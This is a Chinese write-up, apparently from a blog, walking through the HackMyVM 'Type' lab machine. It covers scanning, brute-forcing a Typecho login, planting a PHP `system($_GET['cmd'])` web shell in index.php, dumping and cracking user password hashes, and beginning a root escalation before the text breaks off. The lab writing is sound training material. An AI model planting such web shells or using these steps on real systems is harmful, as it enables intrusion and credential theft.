---
title: HackMyVm靶场之Type.
url: https://mp.weixin.qq.com/s/MexqdsHgsGy7ARzdEygi5g
source: Doonsec's feed
date: 2026-07-13
fetch_date: 2026-07-14T04:46:15.646630
---

# HackMyVm靶场之Type.

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/8avkpGSKmqcv5O99QvT4TyrOVMjvCj04c6GqSxNIVBx7mFforkdHxXDwdNKAibhBPFgX2ufpX6JR1htF3qzsU48hFzKwea03Qc2sySSCwut8/0?wx_fmt=jpeg)

# HackMyVm靶场之Type.

原创

MS02423
MS02423

MS02423

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

继续 Sublarge佬的靶机

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqc9c278qFYgSia71iciaBTDNb7moLkTQHP0VxRPnGclA0tYANWZpUibaolYYMmGOCo6YgHtLjlNDRaHLichj5X6rt9FiboSeHvsSRic5Q/640?wx_fmt=png&from=appmsg)

# 一.信息收集

## 1.探测IP

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqc1aVLFicjpuwqMJcm3kG3MdPDiajPiaSMv2iaokjTyniaoeibU9PPgRMKwIW7HQn4D0PzqNiapknxCZb6dzoQHnk1IGeiayxDKrQoC8nk/640?wx_fmt=png&from=appmsg)

IP是192.168.137.50

## 2.探测端口

```
rustscan -a 192.168.137.50
```

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqehQNkNFlqpyuztldY2sSMTfd5VXwC3YdmjLa8N0LDiastepgR6M2EmHzap1wqsjG9jhBrksgINB0hGTpk4Fp6YyFCnSK2cncLw/640?wx_fmt=png&from=appmsg)

端口开放了80和22端口，所以我们只能在80端口进行下手了

## 3.目录探测

```
gobuster dir -u http://192.168.137.50 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x .php,.html,.txt,.bak,,.log,.zip -t 50
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqdhkhZDXiaqOnXfrcXPICLASEvibQhrR5MBwcUyxseNEMgJMWicOic8MPx1cvW0O7iaXNfFhuXbQA7a4hFSnM1cCzIcq9ibTosSW6S5k/640?wx_fmt=png&from=appmsg)

目前没有扫描到什么目录，我们去80端口看看

# 二.访问IP

```
http://192.168.137.50/
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqebNUg6aGWLhBahV4Im2PmDoicicA54PMvkNfkHyn6JIuV5ImA9ZC2XWXEvuYd2yflrc4Vb38d3oAsNF3q5v98jvHz4RtwKBrkcE/640?wx_fmt=png&from=appmsg)

这个页面，我们可以得到2个信息，一个是需要去绑定域名的，一个是cewl工具，cewl工具是一个密码生成工具。

目前，我们的信息就是这些。

# 三.渗透测试

## 1.绑定域名

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqficLWLgIW2ticsq0Gic8140YCdaLgjtrStZ8MoWXYyOQnSic4eRUzv1FtSI7EUjF40ibBUpDKm9ibhIqVZZowcxiaQTiby7rnQqWhNicpA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqeGayFWFH0HKYIvd4ryNUf7jvC5NEibBl18ejzpB2XnD7aEKlKyGVtfHNUicD8b3EgFZicgZibibW6TCopYqn0sZk5qibD8hkPzCA4Zc/640?wx_fmt=png&from=appmsg)

可以看到绑定成功，可以发现2个用户名的admin和sburro

```
http://type.dsz/admin/login.php
```

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqdtRSQWgiarrnFswOdKicyzoUU0CgOVnKFl1I2b6qiaic3UYgyx27LzQranXeibLrxnx8fPllmqlnw4C2sNJ0MTQfLaxzicichw6yV02s/640?wx_fmt=png&from=appmsg)

扫描到一个登录页面，那么我们去爆破即可

## 2.爆破用户名和密码

前面提示了cewl,我们去生成密码，然后去爆破

```
cewl -w users.txt http://type.dsz
```

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqcAXBfBWgMeVVDEKdIy2RicmzfpwQvWlicP6Lgnp0NfpAn7vTQmFopSUHL3jVlPO7eSjBia7mSGJdeBBLL8v4y92g68jybzRpC6v0/640?wx_fmt=png&from=appmsg)

本来想到使用hydra和bp去爆破，但是爆破都不是很好。

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqeZZP6sSibVur7YInIkgrVftM8hoF2Ew0teq0ibGKEicyN8rfM0MlTr1UC968sSZAib6keXffaTKLL8Vrcn7vbAkSntjLcGa3qACOA/640?wx_fmt=png&from=appmsg)

bp爆破时间对于我的电脑来说，不友好。

我就使用yakit去爆破的

首先去抓包

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqcMx3fgudso90RaDeK1Nrwhs9oDAAQ4zvl2ziaercic5fY5WoBWiboVN4RPlkM4rClJawQvl6YzYDibS47lsLY9PUb0heQsm41w1N8/640?wx_fmt=png&from=appmsg)

然后去设置用户名和密码，然后去爆破

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqdQQzEiaGibT0wneagQPWrkBjcprkYicnzPd8lnCU0vaGbLBNyEk9QRlics2zxQficL56ICibmPwe0gRWudPHIGDpnz5IL6SHW84fkcc/640?wx_fmt=png&from=appmsg)

这里，爆破的话，我们是不去看延迟什么的，而是去看HTTP头相似度

相似度列：Yakit 会自动算相似度，相似度低的往往是突破口

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqeAAJOxPgyDSRSgs0ic88Eby3PhxdMoejHE3Z4jXvD6fUjYyKPibfFKhktuTa2ATucfqAnpk6f9MuPLRianRlQ91BWqhNN3h3pag4/640?wx_fmt=png&from=appmsg)

我们可以看到用户名和密码就是

```
sburro:DevNotes
```

## 3.登录页面

我们去登录即可

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqdX61dzdEzEO294wOAIcQ0vdBR2Dia8YqDho9STFpibNY36fGA8Cc1vC8cIgib4HPUCVFgWRGA8icCpN0xHojujHWOZMo5eVEQU8Co/640?wx_fmt=png&from=appmsg)

我们可以看到登录成功的，我们去搜索搜索

```
http://type.dsz/admin/manage-posts.php
```

我们在文章里面搜索到一个密码的

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqfh5q9dbICpkd1QFgusqxiaEVYCtQ9ia6xic3r7uUnSSz2ib9u4gCPswXsd8ia4s3VfPI3MNCicvDPUISJWHLPYPck3x57YY24Q9ar3g/640?wx_fmt=png&from=appmsg)

猜测是admin用户的密码，因为之前是2个用户名的，我们去登录试试看

```
2DbYCYpXwvV9kKwO
```

## 4.反弹shell

登录成功之后，我们可以去编辑index.php页面的，我们可以去写一句话木马，也可以去反弹shell的

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqcJptCCEStwFEywCcFIqyiaXLI6cxpB7Tdrhl0YAFhWmfVYUNxuzYltpWCNb2MbM9tdI9YfhwwCI6v68ILBPrjXL6v3uX7bNBVg/640?wx_fmt=png&from=appmsg)

我们写入

```
<?php system($_GET['cmd']); ?>
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqeLhf4CibSic1QSqSCdSDcpyhuSA1iboxiakz3AWib31G1kDicUaXIWLwngBgaK411nibkEUuF1ydL6nZsP1wxDstg3bunq227jyA5l0k/640?wx_fmt=png&from=appmsg)

看看是否成功

```
http://192.168.137.50/?12138=id;
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqd4maPGsvZPWqHUFx3UQKe2kiaZdg1ofE7CXz6dGWDz7ASB4pzQ8KPLvsg8v3rlvySz0hulYV7yO5iaXujLQlib7MAQtJ4ib5eDTd0/640?wx_fmt=png&from=appmsg)

OK，反弹shell即可

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqd8SKDTYeyhXyoKZ4UG3zvOGGWIf4yCU3iaY3fUyL3uwdTTwLJzlZumvJ4CMCR21xic4UgwbDS7lqlDct1jthvyQRk5IWC5hbCWA/640?wx_fmt=png&from=appmsg)

## 5.切换plugugly用户

我们可以看到有一个用户是plugugly，那么我们的思路就是去切换到这个用户下

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqfeibPkMYqsuB0Znz5BPPdu1UApOPibMao9AtlKhIicZqze7kFkRvWMic1PMLmjjYDsvJR2guXcCZryht36eEWpo8vMDaMEwYfG8qw/640?wx_fmt=png&from=appmsg)

我们可以看到一个提示是

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqeVRUg3PEsNKtEsflnSkg8I2ia6nvhZnYpZO13AwUOiazKF6qEfI4zt9wJYNkOHdR5liaBVMMJ7HUnEwqBd9xyibHI771kHVO3p4iaY/640?wx_fmt=png&from=appmsg)

我们先保存这条信息，去看看怎么拿用户的shell

我们在/opt/目录下发现了

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqcl9fBmicwTab4VaZZHBxVIvacic63qXwRTQQceibFelBBPbCeQjwg9FwrsiclzT8UkTsmgHcDWtErQJiaLI0uFyt8OlzoiccGO7eZbk/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqcx7ArF0pf2JRMz7lecribVowxdenXj7pVbdyRCj84ymibpGFoL8B4NNtWt0GicjSZsYhCSGoqYSbGEj5BFgEF1viadbj2uBdBc8as/640?wx_fmt=png&from=appmsg)

google搜索是双城记里面的

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqdqA0koLY9KELOQ3T4mNYZpSDNR1GediapBprm36LOR52KMVTUtzv4yyWDUtEiceWwFaIN5cdt7cUhD2JRX5QAoSbMDl2xsyfrgQ/640?wx_fmt=png&from=appmsg)

感觉没什么用，继续去想办法拿shell

首先，我们看到想到是去寻找看看有没有把密码放在哪个目录下

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqd0TCZHicNW7icNjomlxyX5KGo3u3jhBjGb2luic2773DrBwFnoD8bx7QHqFvTxxkaajibe32t8JhAqTpkfwRNh8KrtibejibGhfpyIU/640?wx_fmt=png&from=appmsg)

但是都没有，然后想到去看看配置文件，数据库什么的，因为wordpress一般都会把密码放在配置文件里面的

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqeZ5oTqx90ZAeh58Ho11RxFtrYahzv5oGBtWKOdOtcblnKrukzqYkk4ZeiaDuKpmqIRgicic9CRswK1qMsztibBdnHYUOkrweegJZM/640?wx_fmt=png&from=appmsg)

我们可以看到一个数据库，我们去查询即可

```
SELECT name, password, authCode FROM typecho_users;
```

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqdRhACzKicx27EwGAjFE8vq79coVUDlPTXSrqnfyrhQKzTGtzP1XJvicxvgfIzG9sgsv7gqOS4LvbLG8prvsnUH007LONgGIKpsU/640?wx_fmt=png&from=appmsg)

OK，去爆破密码即可

```
admin|$P$B/xZAkZ342fLS1sEQwQfsXTVKiBnVG/|54d231996c66d6b7e987484a1b0f6c1dsburro|$P$BfS2sY4Vz6sHjC52095jVAFOjMNyuy1|2aef0493fd3265f96310c8b3f3f9fc46plugugly|$P$BuyKfLj9xZ0iLez6SomJNOLGx.7g.U/|
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqdajiahwaaV2VYLLYCve110p2npD5byZVBHRvhMR6dARyWpbrsoY0ibg6mdsicLDMUIRiaJEw5Me5szsDQNexXAgCiaVHxR6We7UgmI/640?wx_fmt=png&from=appmsg)

爆破成功，我们去登录即可

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqe82AdJce9OXy06rpZN0F6krgHw3cVahgs2B3icRoOALeiaS9cyS9JibsZic9l9QQKpRO3jFfGZtmCBOiaynIbian8AxhfQD8Wq20V7U/640?wx_fmt=png&from=appmsg)

## 6.提权root

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqfpiaYVqgMSq2NgqTx7v06L520TSzVABYbKBkwJO2nc9GzTGI87x0AwhnoG1vMgVb3MdEGe1LzIf5bmMWNKdlDjbpv0P9oMQ6t4/640?wx_fmt=png&from=appmsg)

我们去运行linpeas.sh脚本，把信息收集收集全。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqcDqbPjXj2zHs7CicbxVaiaBRDvn7OrjickjIPFRppjl0n0RQ0yCQUe16ictmDud9IO01AZtk9wpC7SjIW0fzBkFSLIVnzndO65iaFI/640?wx_fmt=png&from=appmsg)

我们去看看这个脚本

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqfjr3T5Hwr0SkUUUA4FWFpMJtbluyLhoKbJficIibsiaZtfanEt0CWRbMGcicAcgCUjVcfOX5zKqvDRooa6q5kO9ZXIhdz01V5njfA/640?wx_fmt=png&from=appmsg)

可以看到一个脚本，我们是可以去修改的，但是运行不了，运行是需要root用户运行的，所以想办法让它去运行，那么我们就需要去看看这个typer.py脚本了

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqcw7nYxUYuYBcZIx3rnf7icLNibjVu1uatiasfuhCNselEfQHgXT0F1rsicpKhtYh6fgThp9MzJCeNdeo0dTyD0pfXvQqE0ev7uHSA/...